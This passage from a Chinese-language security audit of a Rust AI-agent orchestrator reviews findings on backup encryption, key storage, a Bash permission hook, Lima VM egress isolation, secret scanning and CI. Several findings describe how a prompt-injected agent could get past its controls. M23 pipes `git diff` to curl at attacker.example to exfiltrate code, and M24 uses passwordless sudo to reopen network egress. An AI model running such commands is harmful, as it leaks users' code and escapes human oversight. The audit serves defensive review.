- **未来风险**：攻击者（或被注入的 Agent）只需往 `backups/` 目录放一个自己构造的、未加密的 SQLite 文件命名为 `x.afbak`，再通过 socket 发一条 `database_backup_restore`，就能整体替换数据库：清空 `events` 审计表、注入 `permission_rules` 永久授权、把任务改成已批准状态。由于 `events` 表（migrations/0001_initial.sql:45）没有哈希链或签名，这种篡改事后无法检测。这是「审计不可篡改」这一设计目标的根本性缺口。
- **改进建议**：让 `decrypt_bytes` 对缺失魔数头的数据直接返回错误（fail-closed），把明文兼容路径改成一次性迁移工具而不是默认行为；在 `.afbak` 头部加入版本、创建时间与数据库路径等 AAD 参与 AEAD 认证；恢复前强制校验 AEAD 通过；并为 `events` 表增加逐条哈希链（prev_sha256 + sha256）或导出时签名，使数据库整体替换/删除在下次启动时可被检测并告警。
- **核查证据**：crates/persistence/src/protection.rs:126-129 确实在无 AFENC1 头时 return Ok(protected.to_vec())，AEAD 完全跳过；restore_encrypted_backup(protection.rs:197-232) 只校验 canonical 路径在 backups/ 下且扩展名 .afbak，随后仅做 PRAGMA integrity_check(143-152) 就 rename 覆盖主库；daemon/src/lib.rs:595 无认证暴露该路径；migrations/0001_initial.sql 的 events 表确实无 prev_hash/签名列。下调为 medium：投放 .afbak 需要对 data_dir 的同 uid 写权限，而同一权限本就能直接改写主库文件，fail-open 解密属于真实但边际收益有限的加固缺口。

### M21. 本地数据密钥以明文文件缓存且与加密备份同目录，Keychain 保护形同虚设

- **位置**：`crates/persistence/src/protection.rs:33`
- **领域**：安全专项｜**分类**：安全
- **状态**：待修复
- **问题**：`load_data_key`（crates/persistence/src/protection.rs:28-45）优先读取 `data_dir/local-data.key` 明文密钥文件并视为权威，只有该文件不存在时才走 Keychain；而走完 Keychain 后 protection.rs:76、90 又立即用 `cache_data_key` 把密钥写回明文文件。`cache_data_key`（107-110）先 `tokio::fs::write` 再 `restrict_file` 改 0600，创建瞬间按默认 umask 通常是 0644。更关键的是：数据库位于 `data_dir`（crates/persistence/src/lib.rs:63-66），备份写入 `data_dir/backups/*.afbak`（protection.rs:162-173），密钥文件就躺在同一个 `data_dir` 里，密文与密钥完全同处一地。
- **未来风险**：Keychain 的价值在于只有签名应用能取到密钥，但这里任何以同一用户身份运行的进程（包括每个 Provider CLI 子进程，它们都拿到了 HOME）都能直接读走 `local-data.key`；备份加密对「整个应用数据目录被 Time Machine 备份、被同步盘同步、被打包发给他人排障」这类真实场景零防护，因为密钥就在旁边。写文件与 chmod 之间的窗口在多用户 Mac 上还会让其他本地用户读到密钥。
- **改进建议**：发布版不要把 Keychain 取回的密钥落盘；确实需要缓存时，改为用 `OpenOptions::mode(0o600).create_new(true)` 原子创建，杜绝先写后 chmod 的窗口；备份密钥与备份文件分离（密钥只放 Keychain，备份目录可放到用户可导出的位置）；并在文档与 UI 上明确说明「数据库本体未加密」，避免用户误以为整目录受保护。
- **核查证据**：protection.rs:33-35 优先把 data_dir/local-data.key 当权威密钥，protection.rs:76 与 90 在取到/新建 Keychain 密钥后立刻 cache_data_key 落盘；cache_data_key(107-110) 先 tokio::fs::write（首次创建按 umask 通常 0644）再 restrict_file 改 0600，窗口真实存在；备份写在同一 data_dir/backups(protection.rs:162-173)。下调为 medium：persistence/src/lib.rs:57-95 显示主库 agentflow.db 本身是未加密 SQLite 且同处 data_dir，该密钥实际只保护备份文件，明文缓存的边际损失限于「备份被导出/同步到别处」场景。

### M22. Provider resume 令牌写入 Keychain 后从不清理，任务删除后仍长期残留

- **位置**：`crates/orchestrator/src/storage.rs:392`
- **领域**：安全专项｜**分类**：安全
- **状态**：待修复
- **问题**：每次成功运行都会把 Provider 会话凭据写进登录 Keychain：`finish_agent_run` 在 crates/orchestrator/src/telemetry.rs:105 调 `put_resume_token`，`permission_request` 在 crates/orchestrator/src/permission_broker.rs:58 也会写一条。但全仓库只有两处调用 `delete_resume_token`（permission_broker.rs:100 事务回滚、permission_broker.rs:293 拒绝/取消任务）。`purge_task`（crates/orchestrator/src/storage.rs:392-406）删除 `agent_runs`、`events` 等行、`permission_requests` 通过外键级联删除，但从未读取这些行里的 `session_secret_ref` / `provider_resume_secret_ref` 去删对应的 Keychain 条目；数据库恢复（protection.rs:197）整体替换库文件时同样不会清理。
- **未来风险**：用户「清空回收站/删除任务」之后，Provider 会话凭据仍然留在 macOS 登录 Keychain 里，服务 `com.agentflow.provider-resume` 下的条目随运行次数无界增长——长期使用会积累成千上万条孤儿条目，既是隐私合规问题（删除请求没有真正删除），也让 Keychain 查询变慢，且任何能读登录 Keychain 的进程都能拿到早已「删除」任务的会话令牌用于续跑。
- **改进建议**：在 `purge_task` 事务提交前先 `SELECT session_secret_ref FROM agent_runs WHERE task_id=?` 与 `SELECT provider_resume_secret_ref FROM permission_requests WHERE task_id=?`，提交后逐个 `delete_resume_token`；对成功完成/已合并的任务在 revision 结束时即刻吊销不再需要的 resume 令牌；再加一个后台巡检任务，把 Keychain 中 `resume-*` 且数据库已无引用的孤儿条目定期清除（并在恢复备份后触发一次全量对账）。
- **核查证据**：telemetry.rs:104-126 每次 finish_agent_run 都 put_resume_token 并写入 agent_runs.session_secret_ref；permission_broker.rs:56-58 也会写一条；全仓库 delete_resume_token 仅 4 处命中（resume_tokens.rs:57 定义、persistence/src/tests.rs:44、permission_broker.rs:100 回滚、:293 拒绝/取消），storage.rs:372-410 的 purge_task 只 DELETE agent_runs/events/tasks 等行，从未读取 session_secret_ref 去删 Keychain 条目；resume_tokens.rs:74-79 证实非临时目录下条目实际落在 com.agentflow.provider-resume 登录 Keychain。下调为 medium：属于删除不彻底/无界增长的数据留存与隐私问题，不构成直接提权，且读取他人 Keychain 条目仍受 ACL 约束。

### M23. Claude Bash 预授权前缀匹配漏掉管道与重定向，可在不触发权限请求的情况下越权

- **位置**：`crates/daemon/src/main.rs:154`
- **领域**：安全专项｜**分类**：安全
- **状态**：待修复
- **问题**：`command_matches_allow`（crates/daemon/src/main.rs:147-157）判定「命令以允许前缀开头且余下部分不含 `&&`、`||`、`;`、换行、反引号、`$(`」就返回允许，钩子随即输出 `{}` 放行，不生成任何权限请求。这个运算符黑名单漏掉了单个管道 `|`、输出/输入重定向 `>`、`>>`、`<`、后台符 `&`、以及 `\r`。默认允许前缀是 `git status`/`git diff`/`git log`（crates/agent-adapters/src/cli_providers.rs:114），并且会追加项目配置里的 `extra_allowed_commands`。单元测试（main.rs:225-232）只覆盖了 `&&` 这一种情况。
- **未来风险**：Provider 只要提交 `git diff | curl -d @- https://attacker.example` 就能在钩子层被判为「已预授权」，把工作树代码外传；`git log --format=... > ~/.zshenv` 之类的重定向可以在工作树之外落地可执行内容，实现持久化。这类操作本应被分类为 `network_access` / `external_path` 并停下来等人工批准，实际却连一条 `permission:requested` 审计事件都不会产生，权限代理在日志上完全「看不见」这次越权。
- **改进建议**：把放行判定从「黑名单运算符」改为「白名单 token」：用真正的 shell 词法解析（如 `shell-words`）拆分命令，要求解析结果只包含单条简单命令、不含任何重定向/管道/后台/替换节点，再逐 token 与允许前缀比对；任何解析失败或出现元字符一律 fail-closed 走权限请求。同时补充 `|`、`>`、`<`、`&`、`\r`、`$((`、`<(` 的回归测试。
- **核查证据**：crates/daemon/src/main.rs:147-157 的黑名单只有 ["&&","||",";","\n","`","$("]，确实漏掉 |、>、>>、<、&、\r，`git diff | curl ...` 会被判为匹配前缀；默认前缀 git status/git diff/git log 见 cli_providers.rs:114-117，测试 main.rs:225-232 只覆盖 &&。下调为 medium：命中允许前缀时钩子输出的是 println!("{}") 空对象（main.rs:109），按 PreToolUse 契约这是「无意见」而非 permissionDecision:allow，命令仍要过 claude_args 里 --allowedTools 的 Bash(git diff:*) 等规则（cli_providers.rs:76-92），所以直接后果是 AgentDock 侧漏掉 permission:requested 审计与权限请求，是否真能执行 curl 取决于 Claude 自身对管道命令的拆分判定，reviewer 所述「随即放行」偏重。

### M24. Lima 隔离可被 VM 内进程用免密 sudo 解除，且校验脚本只看首行无法发现放行规则

- **位置**：`scripts/verify-lima-isolation.sh:17`
- **领域**：安全专项｜**分类**：安全
- **状态**：✅ 已修复（2026-07-28）——不再依赖 VM 全局 iptables 或可变 allowlist。每个受保护验证命令由 root 所有的 `agentflow-offline` 创建独立 network namespace，随后以 SSH 用户、空白环境和 `no_new_privs` 执行；命令即使调用免密 sudo 也无法重新提权。`ExecutionNode.denyNetwork`、SQLite migration 0024、阻塞型分步诊断和真实远端命令路径已贯通。Lima 实机验证确认无宿主项目挂载、无 IPv4/IPv6 默认路由、curl 双栈外联失败、sudo 逃逸失败，真实归档上传→断网执行→清理测试通过。
- **问题**：出网策略靠 VM 内的 `/usr/local/sbin/agentflow-egress-set`（config/lima/agentdock-isolated.yaml 的 provision 脚本）维护，而宿主机侧是用 `limactl shell "$INSTANCE" sudo /usr/local/sbin/agentflow-egress-set`（scripts/set-lima-egress.sh:7、27）调用的——这说明 VM 内默认用户拥有免密 sudo，因此 VM 内任何进程（包括跑在里面的 Agent）都能执行 `sudo iptables -P OUTPUT ACCEPT` 或 `sudo /usr/local/sbin/agentflow-egress-set evil.example=1.2.3.4` 自行放行出网。校验脚本 scripts/verify-lima-isolation.sh:17-18 只断言 `iptables -S OUTPUT | head -1` 等于 `-P OUTPUT DROP`，追加一条 `-A OUTPUT -j ACCEPT` 后该断言依然通过；第 26 行的 `curl https://example.com` 探针在 DNS 本就被禁（yaml 中 `hostResolver.enabled: false` 且无 53 端口放行规则）的情况下必然失败，无论防火墙是否已被打开都会「通过」。此外放行规则是按 `-d IP --dport 443` 授予的，共享 CDN IP 会连带放通同 IP 上的所有站点，/etc/hosts 钉定也可被直接连 IP 绕过。
- **未来风险**：用户以为拿到的是「默认拒绝出网的隔离运行环境」，实际上被注入的 Agent 在 VM 内一条 sudo 命令就能恢复完整出网并外传代码/密钥，而 `verify-lima-isolation.sh` 仍然打印 PASS——错误的安全感比没有隔离更危险。等到真的用它承载不可信任务时，隔离会在最需要的时刻静默失效。
- **改进建议**：在 Lima 配置里取消默认用户的免密 sudo（或把 Agent 放到无 sudo 权限的专用用户下运行），把 egress 策略改为宿主机侧执行、VM 内不可修改（例如用 vz 的网络策略或宿主机 pf 规则，而非 VM 内 iptables）；校验脚本改为断言整条 OUTPUT 链的完整规则集合（比较 `iptables-save` 的规范化输出与期望基线），并用「直接连已知 IP:443」而非依赖 DNS 的探针验证真实出网；放行改为经由宿主机上的 TLS/SNI 感知代理，而不是按 IP 开 443。
- **核查证据**：scripts/set-lima-egress.sh:7、27 与 verify-lima-isolation.sh:16-18 均以非交互 limactl shell ... sudo 执行，证实来宾用户免密 sudo；config/README.md:21 说明该 VM 就是登记给远程执行节点跑 Agent 的，因此 VM 内 Agent 可 sudo /usr/local/sbin/agentflow-egress-set evil=1.2.3.4 自行放行，且 verify-lima-isolation.sh:17-18 只断言 iptables -S OUTPUT | head -1 == -P OUTPUT DROP，追加 ACCEPT 规则不会被发现；yaml:68 也确认放行按 -d IP --dport 443 授予，共享 CDN IP 会连带放通。下调为 medium 并修正一处论据：curl 探针的失败并非「DNS 本就被禁于配置」——DNS 正是被 OUTPUT DROP 拦掉的，若攻击者整链打开 ACCEPT，DNS 恢复、curl 会成功并被 verify 脚本判 FAIL，真正的盲区是「只加窄放行规则」的情况。

### M25. 提交密钥检测存在可预期绕过：大文件跳过扫描、占位符判定过宽、规则覆盖不足

- **位置**：`crates/git-engine/src/lib.rs:377`
- **领域**：安全专项｜**分类**：安全
- **状态**：待修复
- **问题**：`validate_staged_commit`（crates/git-engine/src/lib.rs:377）只对 `metadata.len() <= 1024*1024` 的文件读取内容做密钥扫描，而单文件上限 `MAX_SINGLE_FILE_BYTES` 是 5 MiB（lib.rs:27），也就是 1–5 MiB 的文件可以合法提交且完全不被扫描；用 `symlink_metadata` 取元数据（lib.rs:365）后非普通文件（符号链接）也直接跳过扫描。`looks_like_placeholder`（lib.rs:679-694）用子串匹配 `test`/`example`/`sample` 等，一个真实密钥只要恰好包含这些子串就会被判为占位符而放行。`detected_secret`（lib.rs:655-665）的模式只覆盖 PEM 私钥、AKIA、`gh[pousr]_`、`sk-` 和 6 个具名环境变量，缺少 Google API Key（AIza…）、Slack（xox…）、Azure/GCP 服务账号 JSON、JWT、以及泛化的高熵字符串；`unsafe_path`（lib.rs:637-652）也未覆盖 `.git-credentials`、`.ssh/config` 等常见凭据路径。
- **未来风险**：随着 Agent 自动提交量增大，「密钥被提交到仓库」会以最平常的方式发生：一个 1.5 MB 的 fixture/日志里夹带真实令牌、或者令牌串里恰好含 `test`，提交拦截静默放行；由于这一层是自动化工作流里唯一的密钥闸门（scripts/hooks 下只有跑 verify.sh 的 pre-push），泄漏会直到推送到远端之后才被发现。
- **改进建议**：对所有文本文件（按内容嗅探二进制而非按大小）全量扫描，或把扫描上限提高到与 `MAX_SINGLE_FILE_BYTES` 一致；把占位符判定收紧为「整体等于/以已知占位模板开头」并结合熵值判断，而不是任意位置子串命中；补充 AIza、xox[baprs]-、`-----BEGIN OPENSSH PRIVATE KEY-----`、JWT、GCP service-account JSON 等模式与高熵兜底规则；把 `.git-credentials`、`.ssh/`、`.aws/`、`.gnupg/` 等路径加入 `unsafe_path`；并为每条新规则补上「真密钥被拦截 / 占位符不被误报」的双向测试。
- **核查证据**：crates/git-engine/src/lib.rs:378 的扫描条件是 metadata.len() <= 1024*1024，而单文件上限 MAX_SINGLE_FILE_BYTES = 5 MiB(lib.rs:27)，1–5 MiB 文件可提交且完全不扫描；lib.rs:365 用 symlink_metadata 且只在 is_file() 时扫描；looks_like_placeholder(lib.rs:679-694) 是任意位置子串命中 test/example/sample 等即放行；detected_secret(lib.rs:655-665) 只有 PEM/AKIA/gh[pousr]_/sk- 与 6 个具名环境变量，无 AIza、xox*、JWT、GCP 服务账号 JSON、高熵兜底；unsafe_path(lib.rs:600-652) 的名单含 credentials/credentials.json 但确实不覆盖 .git-credentials、.ssh/ 等路径。维持 medium。

### M26. provider-compatibility 的 pinned 门禁中 Qoder 用 `curl | bash` 装最新版，pinned 名不副实

- **位置**：`.github/workflows/provider-compatibility.yml:28`
- **领域**：工程化横切面｜**分类**：依赖风险
- **状态**：待修复
- **问题**：pinned-contract 任务第 27 行对 claude/codex/grok 用 npm 精确锁版本，但第 28 行 `curl -fsSL https://qoder.com/install | bash` 安装的是上游当天最新版，而 config/provider-compatibility.json 第 36 行只把 1.1.3 列为 verifiedVersions。scripts/verify-provider-cli-contracts.sh 第 49-50 行会在版本不在 pinned 列表时直接抛错。另外该 job 没有 rust toolchain setup 步骤就跑 `cargo test`（第 33 行），依赖 runner 预装工具链恰好满足 edition 2024（≥1.85）。
- **未来风险**：Qoder 每发一个新版本，所有触碰 agent-adapters/ 的无关 PR 的必需门禁都会变红，直到有人更新矩阵；团队会习惯性重跑或忽略该门禁，真正的 CLI 契约漂移反而被淹没。同时每周 schedule 在 CI 里以可写权限执行一段不可审计的远程脚本，是现成的供应链攻击面。
- **改进建议**：让 qoder.com/install 支持并传入版本参数（或改为下载带校验和的定版 tarball），把安装版本与矩阵 verifiedVersions 从同一份 JSON 读出，npm 三个包同理，消除 workflow 与矩阵的双份硬编码；pinned job 显式加 dtolnay/rust-toolchain@stable。
- **核查证据**：provider-compatibility.yml:27 对 claude/codex/grok 用 npm 锁精确版本，:28 却是 curl -fsSL https://qoder.com/install | bash 装当天最新版；config/provider-compatibility.json:35 qodercli 只列 ["1.1.3"]，verify-provider-cli-contracts.sh:49-50 在版本不在 verifiedVersions 时 throw——Qoder 一发新版此必需门禁即变红，核心断言成立；pinned-contract 任务（:20-33）确实只有 checkout+setup-node 没有 rust toolchain 步骤就跑 cargo test，也属实。但报告 future_risk 称"以可写权限执行远程脚本"有误：provider-compatibility.yml:14-15 显式声明 permissions: contents: read，token 只读，供应链爆炸半径受限，且门禁只影响触碰指定 paths 的 PR，故从 high 下调为 medium。

### M27. verify-lima-isolation.sh 的网络隔离检查在 curl 缺失时假通过（fail-open）

- **位置**：`scripts/verify-lima-isolation.sh:26`
- **领域**：工程化横切面｜**分类**：安全
- **状态**：✅ 已修复（2026-07-28）——验收脚本先强制确认 `curl`、`setpriv` 和 root 所有的 wrapper 存在，再在同一个受保护 network namespace 内分别断言 IPv4/IPv6 无默认路由、双栈 HTTPS 失败、sudo 无法提权；任何探针缺失、SSH/limactl 错误或 wrapper 异常都会以非零状态停止，不再被等同于“网络已拒绝”。实例状态改用 Lima Go template 精确读取，不再依赖 JSON 字段顺序。
- **问题**：第 26 行用 `if limactl shell ... curl ...; then FAIL` 判定外联被拒：只要 curl 命令以任何原因失败（VM 里没装 curl、limactl shell 本身出错、实例卡死）就会走到第 31 行打印 PASS。虽然 config/lima/agentdock-isolated.yaml 第 40 行的 provision 会装 curl，但 provision 失败或换了基础镜像时，这个安全验收脚本会在什么都没验证的情况下宣布隔离生效。另有两处脆弱点：第 11 行用 grep 匹配 `limactl list --json` 输出，隐含依赖 JSON 字段顺序与无空格格式；第 5 行把 FORBIDDEN_ROOT 默认值硬编码为个人机器路径 /Users/sapiece/innovationProject/test。配套的 setup-lima-isolation.sh 第 14 行要求 Lima 版本精确等于 2.2.0（yaml 里却只是 minimumLimaVersion），Lima 一出 2.2.1 脚本即拒绝运行。
- **未来风险**：隔离验收脚本的结论会被写进验收记录当作证据；一次 provision 静默失败就可能让“无网络隔离的 VM”被当成已隔离环境去跑不可信 Agent 代码。Lima 精确版本比对则保证了任何一次 brew upgrade 后新人环境搭建必挂。
- **改进建议**：把网络检查改为三态：先 `command -v curl` 确认探针存在，再区分“curl 存在且被拒（PASS）/curl 成功外联（FAIL）/探针不可用（ERROR 退出非零）”。JSON 解析改用 `limactl list --json | jq` 或 --format。FORBIDDEN_ROOT 默认值去掉个人路径改为必填。setup 脚本的版本检查放宽为 >= 2.2.0 的比较并与 yaml 的 minimumLimaVersion 保持单一来源。
- **核查证据**：verify-lima-isolation.sh:26-29 确为 `if limactl shell ... curl ...; then FAIL/exit 1; fi` 后接第 31 行无条件 PASS——curl 不存在（exit 127）、limactl shell 出错等任何失败都与"外联被拒"不可区分，直接假通过；:11 用 grep 匹配 limactl list --json 的 '"name":"...".*"status":"Running"' 隐含依赖 JSON 序列化格式；:5 FORBIDDEN_ROOT 默认值硬编码 /Users/sapiece/innovationProject/test 个人路径；setup-lima-isolation.sh:13-17 用 != "2.2.0" 精确比对版本而 config/lima/agentdock-isolated.yaml:1 只是 minimumLimaVersion: 2.2.0，全部属实。yaml:40 provision 确会装 curl 且 :94-100 有 iptables 开机 probe 兜底，但验收脚本本身 fail-open 成立，medium 恰当。

### M28. bindings/schema 漂移守护用 `git diff --exit-code`，检测不到新增的未跟踪生成文件

- **位置**：`.github/workflows/ci.yml:49`
- **领域**：工程化横切面｜**分类**：CI覆盖度
- **状态**：✅ 已修复（2026-07-27）——漂移守护改为 `git add -A && git diff --cached --exit-code`，新增的未跟踪生成文件同样计为漂移；CI 与 scripts/verify.sh 一并更新。
- **问题**：ci.yml 第 48-49 行和 scripts/verify.sh 第 71-74 行在 `cargo run -p xtask` 后用 `git diff --exit-code` 做契约漂移守护。xtask（crates/xtask/src/main.rs 第 6-19 行）向 packages/schemas/generated/ 写出 3 份 schema——这些文件已被 git 跟踪所以修改会被抓到；但 `git diff --exit-code` 天然忽略未跟踪文件：一旦有人在 xtask/contracts 里新增第 4 份 schema（或 specta 开始输出新文件）却忘记 `git add`，CI 依然全绿，仓库里却永久缺这份契约文件。反向同理：xtask 停止生成某文件时，陈旧的已提交副本也不会被发现。
- **未来风险**：契约文件是前后端与外部 Provider 协议的单一事实来源。缺失的新 schema 会让下游消费方（桌面端、外部 sidecar 校验）拿到过期契约,且这种漂移恰好发生在“新增契约”这种最需要守护的时刻，CI 不会给出任何信号。
- **改进建议**：把守护改为 `git status --porcelain -- packages/schemas apps/desktop/src/generated` 输出必须为空（同时覆盖修改与未跟踪新增），或 `git add -A && git diff --cached --exit-code`。verify.sh --full 同步修改。
- **核查证据**：ci.yml:48-49 与 verify.sh:71-74 均在 cargo run -p xtask 后用 git diff --exit-code 做守护；git diff 天然不含未跟踪文件，git ls-files 确认当前仅跟踪 packages/schemas/generated/ 下 3 份 schema 与 apps/desktop/src/generated/bindings.ts，与 xtask（crates/xtask/src/main.rs:8-19 写 3 份 schema、:32 归一化 bindings.ts）一一对应——一旦 xtask/specta 新增第 4 份输出文件而未 git add，两处守护都会绿灯放行，触发路径具体成立。

### M29. 测试覆盖严重失衡：agentflow-cli 整个 crate 零测试，daemon/contracts 覆盖稀薄

- **位置**：`crates/cli/src/main.rs:208`
- **领域**：工程化横切面｜**分类**：测试缺口
- **状态**：待修复
- **问题**：按 `#[test]`/`#[tokio::test]` 统计：crates/cli 459 行 0 个测试；crates/daemon 1872 行 9 个；crates/contracts 1982 行 2 个；而 orchestrator 有 111 个。cli 是 README 第 64-72 行承诺的 headless 治理入口（task approve/merge/cancel/resume、storage cleanup、api-key set）——这些命令的参数解析、与 daemon 的交互和错误路径完全没有自动化验证。另外 ci.yml 第 21-22 行 Windows 只编译 5 个可移植 crate（注释已承认 IPC 未完成），daemon/orchestrator/cli 在 Windows 上连编译都不验证。
- **未来风险**：cli 的 approve/merge 是绕过桌面端的人工批准通道，一次无测试保护的重构（比如 clap 参数改名、daemon RPC 变更）会让 headless 用户在生产上直接批准失败或误操作而 CI 全绿；Windows 支持每拖一周，未编译的三个核心 crate 的不可移植代码就多积累一批。
- **改进建议**：至少为 cli 增加：clap 命令树的 snapshot/try_parse 测试、每个子命令对 daemon 的请求-响应契约测试（可复用 daemon 的 in-memory Store）。给 contracts 增加序列化 round-trip 测试防止字段重命名破坏磁盘数据。Windows 编译范围在 daemon IPC 完成前先用 `cargo check -p agentflow-daemon` 加入门禁，逼出可移植性问题。
- **核查证据**：实测复现全部数字：crates/cli/src/main.rs 459 行 0 个 #[test]/#[tokio::test]（且无 tests/ 目录），crates/daemon 1872 行 9 个，crates/contracts 1982 行 2 个（均无集成测试目录），orchestrator 111 个；README.md:64-72 确实承诺 task status/resume/approve/merge/cancel 的 headless 入口而 cli/src/main.rs:207-218 起的整条命令分发无任何自动化验证；ci.yml:21-22 Windows 矩阵只测 5 个可移植 crate 且注释自认 IPC 未完成，daemon/orchestrator/cli 在 Windows 连编译都不验证，全部属实。

### M30. CI 工具链全部不锁定且主测试门禁不带 --locked，可重复性和稳定性都受损

- **位置**：`.github/workflows/ci.yml:26`
- **领域**：工程化横切面｜**分类**：CI覆盖度
- **状态**：待修复
- **问题**：ci.yml 第 26 行 `dtolnay/rust-toolchain@stable`、第 38-39 行 `bun-version: latest`，release-macos.yml 第 17 行发版构建同样用 `bun-version: latest`。ci.yml 第 16-18 行的 `cargo test --workspace` 不带 `--locked`（全仓库只有 provider-compatibility.yml 第 33 行用了 --locked），意味着 Cargo.toml 与 Cargo.lock 不一致时 CI 会静默重解析依赖而不是失败，实际测的可能不是提交的锁文件。仓库同时开着 `clippy -D warnings`（ci.yml 第 43 行）。.github/ 下没有 dependabot/renovate 配置。
- **未来风险**：每次 Rust stable 发布带来新 clippy lint，全部 PR 会同时变红（-D warnings + 不锁定工具链的经典组合）；bun 的一次 latest 更新可能让 `bun test` 行为变化甚至让正式发版产物不可复现——发版工作流用漂移的工具链构建签名分发的 DMG。锁文件漂移则让“CI 绿”与“本地 --locked 构建”测的不是同一组依赖。
- **改进建议**：rust-toolchain 用 rust-toolchain.toml 钉具体版本（升级走显式 PR）；bun-version 钉到与本地一致的具体版本，至少 release 工作流必须钉死；所有 cargo test/clippy 加 `--locked`；添加 dependabot 配置管理 GitHub Actions、npm 与 cargo 三类依赖的升级节奏。
- **核查证据**：ci.yml:26 dtolnay/rust-toolchain@stable、:38-39 bun-version: latest，release-macos.yml:17 发版构建同样 bun-version: latest；仓库根无 rust-toolchain.toml；grep 确认全部 workflow 与 verify.sh 中仅 provider-compatibility.yml:33 一处 cargo 命令带 --locked，ci.yml:16-18 的 cargo test --workspace 与 :43 的 clippy -D warnings 均不带；.github/ 下无 dependabot.yml 或 renovate 配置。"新 stable clippy lint + -D warnings 全 PR 变红"与"发版工具链漂移"的风险链条成立。

### M31. 契约生成链依赖 RC/0.0.x 版本的 specta 且存在双 Cargo.lock，一次 cargo update 就能破坏字节级漂移守护

- **位置**：`Cargo.toml:54`
- **领域**：工程化横切面｜**分类**：依赖风险
- **状态**：待修复
- **问题**：workspace Cargo.toml 第 54-55 行依赖 `specta 2.0.0-rc.25` 和 `specta-typescript 0.0.12`；apps/desktop/src-tauri/Cargo.toml 第 16-20 行重复声明同样的 RC 依赖外加 `tauri-specta 2.0.0-rc.25`。因为 src-tauri 被排除出 workspace，仓库存在两份独立的 Cargo.lock（根目录与 apps/desktop/src-tauri/），同一批 crate 被解析两次。Cargo 对预发布版的 caret 语义允许 `cargo update` 直接升到 rc.26+，而 xtask 的 normalize_typescript（crates/xtask/src/main.rs 第 37-48 行）注释明说整套契约守护依赖 specta 输出“byte-stable”。
- **未来风险**：两份锁文件中任意一份单独 update（或新人 clone 后 lock 冲突重解析）就可能拿到输出格式变化的 specta RC，bindings.ts 全文件级 diff 爆炸，契约守护从此每次 CI 失败；rc→正式版的 API 断裂也会同时打断两处。0.0.12 的 specta-typescript 处于高频破坏性变更区间。
- **改进建议**：把 specta 系列用 `=2.0.0-rc.25` 精确钉住（两处同步），或至少在 CI 增加对两份 Cargo.lock 中 specta 版本一致性的校验；中期考虑把 src-tauri 收进 workspace（Tauri 2 支持 workspace 成员）消除双锁文件。
- **核查证据**：根 Cargo.toml:54-55 声明 specta 2.0.0-rc.25 / specta-typescript 0.0.12（非 = 精确钉版），apps/desktop/src-tauri/Cargo.toml:16-17,20 重复声明同批 RC 依赖加 tauri-specta 2.0.0-rc.25；两份 Cargo.lock（根目录与 apps/desktop/src-tauri/）确实并存，当前虽都解析到 rc.25/0.0.12，但 Cargo 对含预发布段的 caret 需求允许 update 升到 rc.26+；crates/xtask/src/main.rs:36-38 注释明言 git diff --exit-code 守护依赖 xtask 输出 byte-stable——任一锁文件单独 update 即可击穿该守护，触发路径具体。

## 低危（Low）

### L01. 事件 sink 任务失败被静默吞掉，实时预算熔断与权限提示检测会整体失效

- **位置**：`crates/orchestrator/src/agent_run.rs:251`
- **领域**：编排器核心｜**分类**：错误处理吞异常
- **状态**：待修复
- **问题**：run_agent 把 live_budget_exceeded 熔断和 looks_like_permission_prompt 检测都放在事件 sink 任务里（agent_run.rs:118-133），而 sink 一开始 File::create 失败（磁盘满、run_dir 权限问题）就整体返回 Err 并 drop 接收端；结束时 `let _ = sink.await;`（agent_run.rs:251）把错误完全丢弃，无日志、无事件记录。此时该次运行的 agent-events.jsonl 缺失，实时预算超限不再取消进程，非结构化权限提示也不再被拦截。
- **未来风险**：磁盘接近写满时（恰是长任务高发场景）：Provider 继续运行直到硬超时，预算实时熔断静默失效导致超支；带交互权限提示的 CLI 挂到 idle timeout 而不是被立即安全停止；事后排障时 agent-events.jsonl 缺失且没有任何错误线索，问题被归咎于 Provider 本身。
- **改进建议**：sink 内把文件写失败与事件处理解耦：文件写失败仅记 warning 并继续消费 rx（保住熔断与权限检测）；`sink.await` 的结果至少写入 events 表或 tracing::error，让运行详情页能显示『事件流未持久化』。
- **核查证据**：属实：agent_run.rs:118-133 的 sink 首行 `File::create(events_path).await?` 失败即整体返回 Err 并 drop 接收端，live_budget_exceeded 熔断（121-123 行）与 looks_like_permission_prompt 检测（124-127 行）随之全部失效；agent_run.rs:251 `let _ = sink.await;` 把错误完全丢弃，无 tracing 也无事件记录，该次运行的 agent-events.jsonl 缺失且无任何线索。触发前提是磁盘满或 run_dir 权限异常，low 恰当。

### L02. task/project 的 seq 用事务外的 SELECT MAX+1 生成，并发创建会撞 UNIQUE 约束

- **位置**：`crates/persistence/src/lib.rs:381`
- **领域**：持久化层｜**分类**：并发/竞态
- **状态**：待修复
- **问题**：create_governed_task_with_acceptance 在 lib.rs:381-385 用 SELECT COALESCE(MAX(seq),0)+1 计算任务序号，但这条查询在 self.pool.begin()（:386）之前、直接跑在池上；import_project_identified 的项目 seq（:259-261）同样在任何事务之外。tasks 有 UNIQUE(project_id,seq)（0001_initial.sql:14），projects.seq 全局 UNIQUE。daemon 对每个 IPC 连接 tokio::spawn 独立处理（daemon/src/lib.rs:267-271），max_connections=1 只序列化单条语句，不序列化『读 MAX → 开事务插入』这个组合，两个并发创建请求可以读到同一个 MAX。
- **未来风险**：桌面端双击提交、CLI 与桌面同时建任务、或将来出现批量导入功能时，第二个请求会以『database error: UNIQUE constraint failed: tasks.project_id, tasks.seq』这类原始数据库错误失败并透传给用户；随着并发入口增多（远程触发、自动化）发生频率会上升。
- **改进建议**：把 seq 计算移进同一事务（BEGIN IMMEDIATE 或直接在 INSERT 中用子查询 INSERT ... VALUES((SELECT COALESCE(MAX(seq),0)+1 FROM tasks WHERE project_id=?), ...)），使读与写在同一个写事务内原子完成；项目导入同理。
- **核查证据**：crates/persistence/src/lib.rs:381-385 的 SELECT COALESCE(MAX(seq),0)+1 确实在 :386 的 pool.begin() 之前直接跑在池上，import_project_identified 的项目 seq（:259-261）同样在事务外；0001_initial.sql:14 有 UNIQUE(project_id,seq)、:4 有 projects.seq UNIQUE；daemon 对每个连接 tokio::spawn（daemon/src/lib.rs:267-271），max_connections=1 只序列化单条语句，两个并发 TaskCreate 可读到相同 MAX 后先后插入同一 seq，竞态真实存在。但下调为 low：竞态窗口仅在 SELECT 与 begin 之间的毫秒级间隙，失败是单次请求报 UNIQUE 错误、重试即恢复，无数据损坏或状态不一致，当前并发入口（桌面双击/CLI 并行）触发频率很低

### L03. 任务创建的多步写入跨越事务边界，崩溃会留下缺 delivery_records 的任务且后续更新静默丢失

- **位置**：`crates/orchestrator/src/task_creation.rs:273`
